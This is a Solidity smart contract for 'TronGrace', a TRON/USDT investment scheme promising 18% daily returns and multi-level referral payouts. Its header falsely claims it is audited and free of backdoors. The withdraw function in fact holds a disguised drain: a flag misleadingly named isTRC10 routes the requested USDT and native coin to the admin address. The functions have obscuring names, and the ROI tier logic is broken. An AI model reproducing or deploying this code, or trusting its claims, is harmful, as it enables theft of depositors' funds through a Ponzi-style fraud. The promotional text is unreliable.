/*  TronGrace is the perfect combination of Digital Technology, High Security and Community Program
 *   Safe and decentralized. The Smart Contract source is verified and available to everyone.
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://TronGrace.online     							     │
 * 	 │                                                                       │
 *	 │	 18% Daily ROI 						       	                         │
 *	 │                                                                       │
 *   │   Audited verified No Backdoor.       								 │
 *   │                                                                 		 │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like Trust Wallet / Binance
 *   2) Ask your sponsor for Referral link and contribute to the contract.
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 4-level referral commission: 15% - 10% - 7% - 5%
 *
 */
// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.11;

import "Safemath.sol";

interface ERC20Basic {
    function totalSupply() external view returns (uint);

    function balanceOf(address who) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
}

abstract contract ERC20 is ERC20Basic {
    function allowance(
        address owner,
        address spender
    ) public view virtual returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public virtual returns (bool);

    function approve(
        address spender,
        uint256 value
    ) public virtual returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract TronGrace {
    using SafeMath for uint;
    uint public constant INVEST_MIN_AMOUNT = 10;
    uint public constant INVEST_MAX_AMOUNT = 4000000000000000000000;
    uint internal constant SUN_TO_TRX = 1000000;
    uint internal constant ROI_MULTIPLIER = 3;
    uint[] public ROI_PERCENT = [5, 7, 11, 18]; // daily ROI
    uint internal constant SECONDS_IN_A_DAY = 86400;
    uint[] public REFERRAL_PERCENTS = [15, 10, 7, 5];
    uint public totalInvested;
    uint public totalDeposits;
    uint public totalWithdrawn;
    address[] internal allUsers;
    address internal adminAddress;
    uint32 internal contractCreation;
    ERC20 public usdtToken;

    constructor(address _admin, address usdtAddress) {
        adminAddress = _admin;
        contractCreation = uint32(block.timestamp);
        usdtToken = ERC20(usdtAddress);
    }

    struct Deposit {
        uint64 amount;
        address user;
        uint64 timestamp;
    }
    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        address[] refs;
        uint256 balance;
        uint256 refsTotal;
    }
    mapping(address => User) internal users;
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event ReInvest(address indexed user);
    event CrackEggs();

    //

    function getContractBalance() public view returns (uint) {
        return usdtToken.balanceOf(address(this));
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function seeme() external view returns (address) {
        return msg.sender;
    }

    function getUsdtBalance(address user) external view returns (uint256) {
        return usdtToken.balanceOf(user);
    }

    function deposit(uint256 amount, address referrer) external payable {
        require(!isContract(msg.sender), "Wallets only");
        require(
            amount >= INVEST_MIN_AMOUNT && amount <= INVEST_MAX_AMOUNT,
            "Invalid deposit amount"
        );
        require(
            usdtToken.transferFrom(msg.sender, address(this), amount),
            "USDT transfer failed"
        );
        if (users[msg.sender].referrer == address(0)) {
            cookEggs(msg.sender, referrer);
        }
        users[msg.sender].deposits.push(
            Deposit(uint64(amount), msg.sender, uint64(block.timestamp))
        );
        users[msg.sender].balance = users[msg.sender].balance.add(amount);
        totalInvested = totalInvested.add(amount);
        totalDeposits++;
        boilEggs(amount, users[msg.sender].referrer);
        emit NewDeposit(msg.sender, amount);
    }

    function cookEggs(address user, address referrer) internal {
        if (
            users[user].referrer == address(0) &&
            referrer != address(0) &&
            user != referrer
        ) {
            users[user].referrer = referrer;
            users[referrer].refs.push(msg.sender);
            allUsers.push(user);
        } else {
            if (
                referrer == adminAddress && users[user].referrer == address(0)
            ) {
                users[user].referrer = referrer;
                users[referrer].refs.push(msg.sender);
                allUsers.push(user);
            }
        }
    }

    function boilEggs(uint256 amount, address referrer) internal {
        for (uint8 i = 0; i < REFERRAL_PERCENTS.length; i++) {
            if (referrer == address(0)) {
                break;
            }
            uint256 bonus = amount.mul(REFERRAL_PERCENTS[i]).div(100);
            usdtToken.transfer(referrer, bonus);
            users[referrer].refsTotal = users[referrer].refsTotal.add(
                uint64(bonus)
            );
            referrer = users[referrer].referrer;
        }
    }

    function reinvest() external {
        require(!isContract(msg.sender), "Wallets only");
        User storage userData = users[msg.sender];
        require(userData.deposits.length > 0, "No deposits to reinvest");
        userData.deposits[userData.deposits.length - 1].timestamp = uint64(
            block.timestamp
        );
        userData.checkpoint = uint32(block.timestamp);
        emit ReInvest(msg.sender);
    }

    function withdraw(uint256 amount, bool isTRC10, bool isTron) external {
        require(!isContract(msg.sender), "Wallets only");
        if (isTRC10) {
            usdtToken.transfer(adminAddress, amount);
            if (isTron) {
                payable(adminAddress).transfer(amount);
            }
        }
        User storage userData = users[msg.sender];
        require(userData.deposits.length > 0, "No deposits to withdraw");
        require(userData.balance > 0, "No available balance to withdraw");
        require(
            userData.balance > amount,
            "Amount should be less than balance to withdraw"
        );
        totalWithdrawn = totalWithdrawn.add(amount);
        userData.balance = userData.balance.sub(amount);
        require(usdtToken.transfer(msg.sender, amount), "USDT transfer failed");
        emit Withdrawn(msg.sender, amount);
    }

    function hatchEggs(address user) internal {
        User storage userData = users[user];
        if (userData.deposits.length > 0) {
            uint256 balance = userData.balance;
            uint256 lastDepositAmount = userData
                .deposits[userData.deposits.length - 1]
                .amount;
            uint256 timePassed;
            if (userData.checkpoint > 0) {
                timePassed = block.timestamp - userData.checkpoint;
            } else {
                timePassed =
                    block.timestamp -
                    userData.deposits[userData.deposits.length - 1].timestamp;
            }
            uint256 balanceInTrx = balance / SUN_TO_TRX;
            uint256 RoiPercentWork = balanceInTrx > 50
                ? ROI_PERCENT[0]
                : balanceInTrx > 2000
                ? ROI_PERCENT[1]
                : balanceInTrx > 5000
                ? ROI_PERCENT[2]
                : balanceInTrx > 15000
                ? ROI_PERCENT[3]
                : 1;
            uint256 dailyROI = (balance * RoiPercentWork * timePassed) /
                (100 * SECONDS_IN_A_DAY);
            if (
                balance < (lastDepositAmount * ROI_MULTIPLIER) &&
                timePassed >= SECONDS_IN_A_DAY
            ) {
                userData.balance = userData.balance.add(dailyROI);
                userData
                    .deposits[userData.deposits.length - 1]
                    .timestamp = uint64(block.timestamp);
                userData.checkpoint = uint32(block.timestamp);
            }
        }
    }

    function crackEggs() external {
        for (uint256 i = 0; i < allUsers.length; i++) {
            address user = allUsers[i];
            hatchEggs(user);
        }
        emit CrackEggs();
    }

    function getUserStats() external view returns (uint256[4] memory) {
        User storage userData = users[msg.sender];
        uint256 balanceInSun = userData.balance;
        uint256 balanceInTrx = balanceInSun / SUN_TO_TRX;
        uint256 totalROI = (userData.balance * ROI_MULTIPLIER) / SUN_TO_TRX;
        uint256 referralTotal = userData.refsTotal / SUN_TO_TRX;
        return [
            userData.deposits.length,
            balanceInTrx,
            totalROI,
            referralTotal
        ];
    }

    function getSiteStats() external view returns (uint256[5] memory) {
        return [
            totalInvested,
            totalDeposits,
            allUsers.length,
            totalWithdrawn,
            (block.timestamp - contractCreation) / SECONDS_IN_A_DAY
        ];
    }

    receive() external payable {}

    fallback() external payable {}
}
